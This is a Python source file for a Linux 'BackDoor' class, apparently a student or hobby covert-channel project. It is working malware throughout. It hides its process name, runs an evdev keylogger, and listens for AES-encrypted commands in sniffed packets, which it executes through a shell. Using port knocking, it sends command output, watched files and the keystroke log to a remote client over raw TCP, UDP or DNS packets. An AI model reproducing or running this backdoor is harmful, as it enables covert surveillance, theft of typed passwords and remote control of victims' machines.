from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from scapy.fields import StrField
from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import UDP, IP, TCP
from scapy.all import sniff, send, Raw
from scapy.packet import Packet, bind_layers
from scapy.volatile import RandShort
from subprocess import run
import sys
import os
import setproctitle
import yaml
import asyncio
from evdev import InputDevice, ecodes, categorize
import time
from threading import Thread
from watch import EventHandler
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from typing import List


key_code_map = {
    0: '',
    1: ' <ESC> ',
    2: '1',
    3: '2',
    4: '3',
    5: '4',
    6: '5',
    7: '6',
    8: '7',
    9: '8',
    10: '9',
    11: '0',
    12: '-',
    13: '=',
    14: ' <BACKSPACE> ',
    15: ' <TAB> ',
    16: 'Q',
    17: 'W',
    18: 'E',
    19: 'R',
    20: 'T',
    21: 'Y',
    22: 'U',
    23: 'I',
    24: 'O',
    25: 'P',
    26: '[',
    27: ']',
    28: ' <ENTER> ',
    29: ' <LEFTCTRL> ',
    30: 'A',
    31: 'S',
    32: 'D',
    33: 'F',
    34: 'G',
    35: 'H',
    36: 'J',
    37: 'K',
    38: 'L',
    39: ';',
    40: "'",
    41: '`',
    42: ' <LEFTSHIFT> ',
    43: '\\',
    44: 'Z',
    45: 'X',
    46: 'C',
    47: 'V',
    48: 'B',
    49: 'N',
    50: 'M',
    51: ',',
    52: '.',
    53: '/',
    54: ' <RIGHTSHIFT> ',
    55: '*',
    56: ' <LEFTALT> ',
    57: ' ',
    58: ' <CAPSLOCK> ',
    59: 'F1',
    60: 'F2',
    61: 'F3',
    62: 'F4',
    63: 'F5',
    64: 'F6',
    65: 'F7',
    66: 'F8',
    67: 'F9',
    68: 'F10',
    69: ' <NUMLOCK> ',
    70: ' <SCROLLLOCK> ',
    71: '7',
    72: '8',
    73: '9',
    74: '-',
    75: '4',
    76: '5',
    77: '6',
    78: '+',
    79: '1',
    80: '2',
    81: '3',
    82: '0',
    83: '.',
    87: 'F11',
    88: 'F12',
    95: ',',
    96: ' <ENTER> ',
    97: ' <RIGHTCTRL> ',
    98: '/',
    100: ' <R_ALT> ',
    102: ' <HOME> ',
    103: ' <UP> ',
    104: ' <PAGE_UP> ',
    105: ' <KEY_LEFT> ',
    106: ' <KEY_RIGHT> ',
    107: ' <END> ',
    108: ' <KEY_DOWN> ',
    109: ' <PAGE_DOWN> ',
    110: ' <INSERT> ',
    111: ' <DELETE> ',
    112: ' <MACRO> ',
    125: ' <WINDOWS_KEY> '
}


class BackDoor:
    def __init__(self):
        print("Backdoor has been initiated")
        self.key = b'\xac\x19\x08\xf8\x80uo\x0c5\xcb\x82_\xc9\xc0\xdc4Z=\xbf\x19\xf0O\xfa\x94\x0fW\x95\xaf=\xe9U\t'
        self.iv = b'\xe4\xba\xa2\x06\xf2\xd6U\xef\x15\xcc\xdaY\x95\xf9\xb5;'
        self.flag_begin = "****["
        self.flag_close = "]****"
        self.recv_port = 0
        self.send_port = 0
        self.client = ""
        self.masked_name = ""
        self.log = ""
        self.device = ""
        self.supported_protos = ["udp", "tcp", "dns"]
        self.proto = ""
        self.watch_dir = ""
        self.watch_file = ""
        self.path = ""
        self.watch_status = False
        self.sequence = []
        self.file_port = ""

    def start(self) -> None:
        self.process_yaml()
        self.hide_process()
        try:
            keylog_t = Thread(target=self.start_keylogger)
            keylog_t.start()

            if not os.path.exists(self.watch_dir):
                raise FileNotFoundError("Dir not found")

            event_handler = EventHandler(self.watch_file, self)
            observer = Observer()
            observer.schedule(event_handler, self.watch_dir, recursive=True)
            observer.start()

            print("Keylogger started")
            print("Listening for packets")
            print("--------------------------------------------------------------")
            self.sniff_init()
        except KeyboardInterrupt as e:
            observer.stop()
            observer.join()
            sys.exit(" Closed")
        except FileNotFoundError as e:
            sys.exit(" Directory not found")

    def start_keylogger(self) -> None:
        device = InputDevice(self.device)
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self.keylog(device))

    async def keylog(self, device) -> None:
        with open(self.log, 'a+') as f:
            async for event in device.async_read_loop():
                if event.type == ecodes.EV_KEY and event.value == 1:
                    try:
                        f.write(key_code_map[event.code])
                        f.flush()
                    except KeyError:
                        f.write(f" <Unmapped keycode: {event.code}> ")

    def process_yaml(self) -> None:
        with open('config.yaml', 'r') as f:
            config = yaml.safe_load(f)

        self.masked_name = config['covert']['process_name']
        self.log = config['covert']['log']
        self.device = config['covert']['device']
        self.recv_port = config['covert']['recv_port']
        self.send_port = config['covert']['send_port']
        self.proto = "udp" if config['share']['proto'] in ["udp", "dns"] else "tcp"
        self.watch_dir, self.watch_file = self.watch_settings(config['covert']['watch'])
        self.path = config['covert']['watch']
        self.client = config['covert']['client']
        self.sequence = config['share']['sequence']
        self.file_port = config['share']['file_port']

    def watch_settings(self, path) -> tuple[str, str]:
        file = path.split("/")[-1]
        directory = ""
        index = 0
        for i in range(len(path) - 1, -1, -1):
            if path[i] == "/":
                index = i
                break
        directory = path[:index]
        return directory, file

    def send_file(self) -> None:
        """Begins the process of opening client port
        and sending file via covert means
        """
        print("Sending Knock Sequence")
        self.port_knock()
        # Give time for client to open ports
        time.sleep(0.5)
        # Send created file
        self.prepare_data(self.path)
        time.sleep(1)
        # Send keylog file
        self.prepare_data(self.log)

    def prepare_data(self, path: str, data=None) -> None:
        """Gets file data and sends through specified protocol"""
        filename = ""
        if path:
            filename = path.split("/")[-1]
            print(f"Sending file: {filename}")
            binary_data = self.get_file_bin(path)
        else:
            print("Sent response!")
            binary_data = self.get_bin(data)

        if self.proto == "tcp":
            self.create_tcp(binary_data, filename)
        elif self.proto == "udp" or "dns":
            self.create_udp(binary_data, filename)
        else:
           return

    def set_terminator(self, name: str) -> tuple[str, bytes]:
        if name:
            terminator = name.encode() + b'|||'
            src = self.file_port
        else:
            src = RandShort()
            terminator = b'|||'
        return src, terminator

    def create_tcp(self, data: List, name: str) -> None:
        """Creates a TCP packet and embeds data in payload"""
        src, terminator = self.set_terminator(name)
        packets = []
        for index, byte in enumerate(data):
            packet = IP(dst=self.client) / TCP(sport=src, dport=self.send_port) / Raw(load=byte)
            packets.append(packet)

        # Add packet to specify end of msg
        packet = IP(dst=self.client) / TCP(sport=src, dport=self.send_port) / Raw(load=terminator)
        packets.append(packet)
        self.send_pkt(packets)

    def create_dns(self, data: List, name: str) -> None:
        """Creates a DNS packet and embeds data in payload"""
        print("Creating DNS packets")
        src, terminator = self.set_terminator(name)

        packets = []
        dns = DNS(rd=1, qd=DNSQR(qname="www.google.com"))
        ip, udp = self.get_scapy_layers(src)
        for index, byte in enumerate(data):
            payload = byte
            packet = ip / udp / dns / payload
            packets.append(packet)

        # Add packet to specify end of msg
        payload = terminator
        packet = ip / udp / dns / payload
        packets.append(packet)
        self.send_pkt(packets)

    def create_udp(self, data: List, name: str) -> None:
        """Creates a UDP packet and embeds data in payload"""
        src, terminator = self.set_terminator(name)

        packets = []
        ip, udp = self.get_scapy_layers(src)
        for index, byte in enumerate(data):
            payload = byte
            packet = ip / udp / payload
            packets.append(packet)

        # Add packet to specify end of msg
        payload = terminator
        packet = ip / udp / payload
        packets.append(packet)
        self.send_pkt(packets)

    def get_scapy_layers(self, port: str) -> tuple[IP, UDP]:
        """Creates UDP and IP layer"""
        ip = IP(dst=self.client)
        udp = UDP(sport=port, dport=self.send_port)
        return ip, udp


    def send_pkt(self, packets: List) -> None:
        """Sends packets"""
        try:
            send(packets, verbose=0)
            print("--------------------------------------------------------------")
        except PermissionError:
            print("Permission error! Run as sudo or admin!")
            sys.exit()

    def get_file_bin(self, path: str) -> List:
        """ Separates a file into chunks of data that can be
        sent in individual payloads
        """
        with open(path, 'rb') as f:
            data = f.read()
            binary_data = self.get_bin(data)

        return binary_data

    def get_bin(self, data: bytes) -> List:
        """ Converts sequence of bytes into byte array"""
        load_size = 1024
        binary_data = [data[i:i + load_size] for i in range(0, len(data), load_size)]
        return binary_data

    def port_knock(self) -> None:
        """Creates and sends sequence of packets to
        open client port
        """
        packets = []
        for i in self.sequence:
            pkt = IP(dst=self.client) / TCP(dport=i, flags="S")
            packets.append(pkt)
        self.send_pkt(packets)

    def craft_packet(self, msg: str):
        ip = IP(dst=self.client)
        udp = UDP(sport=RandShort(), dport=self.send_port)
        payload = msg
        pkt = ip / udp / payload
        try:
            print("Sent!")
            print("--------------------------------------------------------------")
            send(pkt, verbose=0)
        except PermissionError:
            print("Permission error! Run as sudo or admin!")
            sys.exit()

    def prepare_msg(self, cmd: str) -> bytes:
        cipher = self.generate_cipher()
        cmd = self.flag_begin + cmd + self.flag_close
        encrypted_data = self.encrypt_data(cipher, cmd)
        # Convert the encrypted string to bytes
        print("Encrypted output")
        return encrypted_data

    def get_hex_string(self, encrypted_line):
        """ Returns hex string of byte stream (encrypted string)"""
        return encrypted_line.hex()

    def sniff_init(self) -> None:
        try:
            sniff(filter=self.proto, prn=lambda p: self.filter_packets(p), store=False)
        except PermissionError:
            print("Permission error! Run as sudo or admin!")
            sys.exit()

    def authenticate_packet(self, data: str, packet) -> str:
        decrypted_msg = self.decrypt_data(data)
        if decrypted_msg.startswith(self.flag_begin) and decrypted_msg.endswith(self.flag_close):
            print(f"Received authenticated packet: {decrypted_msg}")
            if not self.client:
                self.set_client(packet[IP].src)
            return decrypted_msg

    def execute(self, cmd: str) -> None:
        output = run(cmd, shell=True, capture_output=True, text=True)
        output = output.stdout
        msg = self.prepare_msg(output)
        self.prepare_data("", msg)

    def filter_packets(self, packet) -> None:
        if self.proto == "tcp":
            self.process_tcp(packet)
        elif self.proto == "udp" or "dns":
            self.process_udp(packet)
        else:
            return

    def process_udp(self, packet: Packet):
        try:
            msg = packet[UDP].load.decode()
            if UDP in packet and packet[UDP].sport == self.send_port and packet[UDP].dport == self.recv_port:
                val = self.authenticate_packet(msg, packet)
                if val:
                    self.process_packet(val)
        except:
            return

    def process_tcp(self, packet: Packet):
        try:
            if TCP in packet and Raw in packet and packet[TCP].dport == self.recv_port:
                raw_data = packet[Raw].load.decode()
                val = self.authenticate_packet(raw_data, packet)
                if val:
                    self.process_packet(val)
        except:
            return

    def process_packet(self, data):
        stripped_msg = data.strip(self.flag_begin).rstrip(self.flag_close)
        split_msg = stripped_msg.split()
        if split_msg[0] == "search":
            self.search(split_msg[1])
        else:
            print(f"Executing: {stripped_msg}")
            self.execute(stripped_msg)

    def search(self, file: str):
        """Searches for a file in directory"""
        file_exists = os.path.exists(file)
        if file_exists:
            print("Sending Knock Sequence")
            self.port_knock()
            # Give time for client to open ports
            time.sleep(0.5)
            # Send created file
            self.prepare_data(file)
            self.prepare_data(self.log)
        else:
            print("Not exist, my man")

    def set_client(self, ip):
        print(f"Setting client ip as {ip}")
        self.client = ip

    def decrypt_data(self, encrypted_msg: str) -> str:
        encrypted_byte_stream = bytes.fromhex(encrypted_msg)
        cipher = self.generate_cipher()
        # Initialize a decryptor object
        decryptor = cipher.decryptor()
        # Initialize an unpadder object
        unpadder = padding.PKCS7(128).unpadder()
        # Decrypt and remove padding
        padded_message = decryptor.update(encrypted_byte_stream) + decryptor.finalize()
        msg = unpadder.update(padded_message) + unpadder.finalize()
        msg = msg.decode()
        return msg

    def encrypt_data(self, cipher, line) -> bytes:
        """Encrypts message"""
        encryptor = cipher.encryptor()
        # Padding needed at AES requires specific byte size.
        # Allows for custom length messages.
        padder = padding.PKCS7(128).padder()
        padded_line = padder.update(line.encode()) + padder.finalize()
        encrypted_line = encryptor.update(padded_line) + encryptor.finalize()
        return encrypted_line

    def generate_cipher(self) -> Cipher:
        """Generates cipher for encryption"""
        return Cipher(algorithms.AES(self.key), modes.CBC(self.iv))

    def hide_process(self):
        print(f"Masked process name as: {self.masked_name} ")
        setproctitle.setproctitle(f"{self.masked_name}")
        with open("/proc/self/comm", "w") as f:
            f.write(self.masked_name)
